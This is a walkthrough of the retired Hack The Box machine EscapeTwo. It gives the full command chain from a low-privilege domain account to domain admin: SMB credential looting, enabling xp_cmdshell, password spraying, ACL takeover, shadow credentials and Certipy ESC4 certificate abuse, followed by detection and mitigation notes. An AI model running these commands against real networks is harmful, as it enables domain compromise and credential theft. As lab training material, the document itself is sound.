---
title: "HTB EscapeTwo"
description: "A retired HTB Active Directory machine: from one low-privilege domain account through SMB, MSSQL, and certificate services to domain admin."
kind: writeup
category: "Active Directory"
tags: [active-directory, htb, writeup]
order: 10
status: published
source: repo
---

<div class="callout info">

TL;DR: Starting from one low-privilege domain account, I enumerated SMB, recovered credentials from spreadsheet XML, ran commands through MSSQL `xp_cmdshell`, password-sprayed a config-file password to reach a WinRM user, abused Active Directory ACLs, and finished by exploiting an ADCS certificate template (ESC4) to authenticate as the domain administrator.

</div>

| Category | Difficulty | Platform | Tools | Mapping |
|---|---|---|---|---|
| Active Directory, ADCS abuse | Easy | Retired HTB machine | Nmap, netexec (nxc), smbclient, Impacket (mssqlclient, owneredit, dacledit), SharpHound/BloodHound, PyWhisker, PKINITtools, Certipy, evil-winrm | Valid Accounts (T1078), Network Share Discovery (T1135), Credentials In Files (T1552.001), Command and Scripting Interpreter (T1059), Brute Force: Password Spraying (T1110.003), Account Manipulation (T1098), Steal or Forge Authentication Certificates (T1649) |

## Scope and environment

EscapeTwo is a retired HTB Windows machine with a public walkthrough. The box is an Active Directory exercise, built around SMB, MSSQL, and Active Directory Certificate Services on Windows Server 2019. The target sat at `10.10.11.51` in the `sequel.htb` domain, and the box starts you with a set of low-privilege credentials for the user `rose` (redacted).

I redact credentials in the commands on this page. Some screenshots still show the box's own lab passwords and hashes, which only ever existed on this retired machine.

## Recon and approach

A full TCP scan with service, script, and OS detection showed the usual AD service spread (SMB, Kerberos, LDAP, MSSQL, WinRM).

```bash title="recon.sh"
nmap -p- -sV -sC -O 10.10.11.51
```

![Nmap scan of 10.10.11.51 showing DNS, Kerberos, RPC, NetBIOS and LDAP ports open for the sequel.htb domain](/images/writeups/htb-escapetwo/01.png)

SMB and Kerberos were the immediate interest. With valid credentials in hand, the plan was: enumerate shares, find something readable, and look for credentials to move up.

## Exploitation

### SMB enumeration and credentials in spreadsheet XML

Using the starting credentials I enumerated shares and found a readable `Accounting Department` share.

```bash title="smb.sh"
nxc smb 10.10.11.51 -u 'rose' -p '<redacted>' --shares
smbclient '//10.10.11.51/Accounting Department' -U 'rose'
```

![nxc SMB share listing for rose showing read access to the Accounting Department share](/images/writeups/htb-escapetwo/02.png)

![smbclient session opened on the Accounting Department share as rose](/images/writeups/htb-escapetwo/03.png)

I pulled down two Excel files. `file` showed they were not quite what the extension claimed, so I treated them as ZIP archives (which modern `.xlsx` files are) and unzipped them. Inside `xl/sharedStrings.xml` were usernames and passwords, including the MSSQL `sa` account credentials (redacted).

![smbclient listing and download of accounts.xlsx and accounting_2024.xlsx](/images/writeups/htb-escapetwo/04.jpg)

![file command output identifying both xlsx files as Zip archive data](/images/writeups/htb-escapetwo/05.jpg)

![Table built from sharedStrings.xml with lab account records redacted](/images/writeups/htb-escapetwo/06.png)

### MSSQL command execution

The recovered `sa` credentials authenticated to MSSQL. Connecting with Impacket's MSSQL client, I confirmed the version and then used `xp_cmdshell` for command execution. When `xp_cmdshell` is disabled, you can re-enable it from a privileged SQL login.

![nxc MSSQL local-auth check showing the sa login accepted on DC01](/images/writeups/htb-escapetwo/07.png)

```bash title="mssql.sh"
python3 mssqlclient.py sa:'<redacted>'@10.10.11.51
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

My first `xp_cmdshell` call was blocked, so I turned the option on with `sp_configure` and checked the run value.

![MSSQL client listing the databases, then xp_cmdshell whoami blocked because the component is turned off](/images/writeups/htb-escapetwo/09.jpg)

![sp_configure output showing show advanced options and xp_cmdshell changed to 1](/images/writeups/htb-escapetwo/10.jpg)

![sp_configure xp_cmdshell output showing config_value 1 and run_value 1](/images/writeups/htb-escapetwo/11.jpg)

### Config-file password and spraying to ryan

Searching the filesystem through `xp_cmdshell`, I found a SQL Server configuration file (`sql-Configuration.INI`) containing the `SQLSVCPASSWORD` (redacted). That password did not match the account I first tried, so I sprayed it across the domain user list.

![xp_cmdshell dir of the C: drive root showing the SQL2019 directory](/images/writeups/htb-escapetwo/13.jpg)

![xp_cmdshell dir of the SQL2019 folder showing the ExpressAdv_ENU directory](/images/writeups/htb-escapetwo/14.jpg)

```bash title="spray.sh"
nxc smb 10.10.11.51 -u 'rose' -p '<redacted>' --users   # build adusers.txt
nxc winrm 10.10.11.51 -u adusers.txt -p '<redacted>'
```

![nxc WinRM password spray across adusers.txt failing for several accounts and succeeding for ryan](/images/writeups/htb-escapetwo/17.png)

The password matched the user `ryan`, and `ryan` could log in over WinRM with evil-winrm. A hash was waiting on `ryan`'s desktop (redacted).

![evil-winrm shell opened as ryan in his Documents folder](/images/writeups/htb-escapetwo/19.png)

### BloodHound and ACL abuse

I ran SharpHound to collect data for BloodHound. The graph showed a path through object permissions, so I used Impacket to take ownership of the `ca_svc` object and then grant myself full control over it.

![evil-winrm upload of SharpHound.exe to ryan's Documents folder](/images/writeups/htb-escapetwo/20.jpg)

![SharpHound run with all collection methods finishing enumeration of sequel.htb](/images/writeups/htb-escapetwo/21.jpg)

```bash title="acl.sh"
python3 owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<redacted>'
python3 dacledit.py -action write -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<redacted>'
```

The first `owneredit.py` attempts failed until I fixed the syntax and added `sequel.htb` to `/etc/hosts`.

![owneredit.py attempts ending with OwnerSid modified successfully on ca_svc](/images/writeups/htb-escapetwo/24.png)

![dacledit.py output showing the DACL backed up and modified successfully for ca_svc](/images/writeups/htb-escapetwo/25.png)

### Shadow credentials and ADCS ESC4 to Domain Admin

With control over `ca_svc`, I used PyWhisker to add a Key Credential (shadow credentials) to the account, which let me authenticate as it and obtain a TGT and NT hash through PKINITtools (both redacted).

![PyWhisker adding a KeyCredential to ca_svc and saving a PFX certificate](/images/writeups/htb-escapetwo/26.png)

![gettgtpkinit.py requesting a TGT for ca_svc with the PFX and saving it to a file](/images/writeups/htb-escapetwo/27.png)

![getnthash.py recovering the NT hash for ca_svc from the TGT](/images/writeups/htb-escapetwo/28.png)

![nxc SMB check showing the ca_svc NT hash accepted on DC01](/images/writeups/htb-escapetwo/29.png)

`ca_svc` had rights over a certificate template, which is the ESC4 condition: an attacker who can edit a template can make it issue authentication certificates for arbitrary users. With Certipy I modified the `DunderMifflinAuthentication` template, requested a certificate specifying the domain administrator as the subject, and then authenticated with that certificate to recover the administrator's hash. That hash logged me in as `administrator` over WinRM.

![Certipy find as ca_svc enumerating 34 certificate templates and one certificate authority](/images/writeups/htb-escapetwo/30.png)

![Certipy output for the DunderMifflinAuthentication template flagging ESC4 because Cert Publishers has dangerous permissions](/images/writeups/htb-escapetwo/33.jpg)

![Certipy template command saving the old configuration and updating DunderMifflinAuthentication](/images/writeups/htb-escapetwo/31.png)

![Certipy output after the change showing Authenticated Users with full control of the template and ESC1 to ESC3 flagged](/images/writeups/htb-escapetwo/36.jpg)

```bash title="adcs.sh"
# modify the template, then request a cert as administrator (values redacted)
certipy-ad req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc@sequel.htb \
  -hashes <redacted> -template DunderMifflinAuthentication \
  -target dc01.sequel.htb -upn administrator@sequel.htb -dns dc01.sequel.htb
certipy-ad auth -pfx administrator_dc01.pfx
evil-winrm -i 10.10.11.51 -u 'administrator' -H <redacted>
```

![Certipy req output issuing a certificate with UPN administrator@sequel.htb saved as administrator_dc01.pfx](/images/writeups/htb-escapetwo/38.png)

![Certipy auth with administrator_dc01.pfx getting a TGT and the administrator NT hash](/images/writeups/htb-escapetwo/39.png)

![evil-winrm shell opened as administrator using the NT hash](/images/writeups/htb-escapetwo/40.png)

![Administrator desktop listing showing root.txt](/images/writeups/htb-escapetwo/41.jpg)

![Hack The Box card stating EscapeTwo has been Pwned, dated 29 Jan 2025, machine state retired](/images/writeups/htb-escapetwo/43.png)

## Detection and mitigation

This is my after-the-fact analysis, not detections I built or tested.

**SMB share access and file read (Network Share Discovery, T1135; Credentials In Files, T1552.001).**
- Telemetry: Windows Security event 5140/5145 (share and file access), SMB server logs.
- Detection would key on: a low-privilege account reading files from a sensitive share it does not normally touch, especially accounting or configuration documents.
- Fix: least privilege on share ACLs, and never store credentials in spreadsheets or config files on readable shares.

**MSSQL xp_cmdshell (Command and Scripting Interpreter, T1059).**
- Telemetry: SQL Server audit logs for `sp_configure` changes and `xp_cmdshell` use, plus process creation (event 4688) showing `sqlservr.exe` spawning `cmd.exe`.
- Detection would key on: `xp_cmdshell` being enabled, and the SQL Server service account spawning command shells. That is almost always malicious in production.
- Fix: keep `xp_cmdshell` disabled, do not use the `sa` account for applications, run SQL Server under a low-privilege service account, and alert on `sp_configure` changes.

**Password spraying (Brute Force: Password Spraying, T1110.003).**
- Telemetry: authentication logs (event 4625 failures, 4624 success) showing one password tried across many accounts.
- Detection would key on: a single source attempting one credential against many usernames in a short window.
- Fix: unique service-account passwords, account lockout and smart lockout, and do not leave service passwords in config files.

**ACL abuse (Account Manipulation, T1098).**
- Telemetry: directory service change events 5136 (object modified), 4662 (operation on an object), showing owner and DACL changes.
- Detection would key on: write to `nTSecurityDescriptor` or owner changes on a service or CA-related object by a non-administrative principal.
- Fix: audit and tighten ACLs on sensitive objects, especially ADCS service accounts, and monitor DACL changes on Tier 0 objects.

**Shadow credentials and ADCS ESC4 (Steal or Forge Authentication Certificates, T1649).**
- Telemetry: directory changes to `msDS-KeyCredentialLink` (shadow credentials), AD CS issuance logs (event 4886/4887), certificate-template modification events, and PKINIT/certificate-based logons (event 4768 with certificate info).
- Detection would key on: writes to `msDS-KeyCredentialLink`, certificate-template security changes, and a certificate request where the subject or UPN does not match the requesting account.
- Fix: remediate the ESC4 condition by restricting who can edit certificate templates, remove `EDITF_ATTRIBUTESUBJECTALTNAME2` if set, enable manager approval or restrict enrollment on authentication templates, and monitor `msDS-KeyCredentialLink` changes. Microsoft's guidance and the Certified Pre-Owned research both cover the ADCS ESC classes.

## Key takeaways

- Credentials kept turning up at rest: spreadsheet XML, a SQL config file, a hash on a desktop. Each hop was a credential-hygiene failure, not a memory-corruption exploit.
- `xp_cmdshell` plus an over-privileged `sa` account is a direct SQL-to-OS bridge. Disabling it and de-privileging the service account breaks that bridge.
- BloodHound turned a pile of permissions into a visible path. ACL misconfigurations on service accounts are easy to overlook and easy to graph.
- The domain fell to an ADCS template misconfiguration (ESC4), not to a password. Certificate services are Tier 0 and need to be treated that way.

## References

- SpecterOps, Certified Pre-Owned (ADCS ESC research): https://posts.specterops.io/certified-pre-owned-d95910965cd2
- Microsoft, Active Directory Certificate Services security guidance: https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/
- MITRE ATT&CK, Steal or Forge Authentication Certificates (T1649): https://attack.mitre.org/techniques/T1649/
- MITRE ATT&CK, Brute Force: Password Spraying (T1110.003): https://attack.mitre.org/techniques/T1110/003/
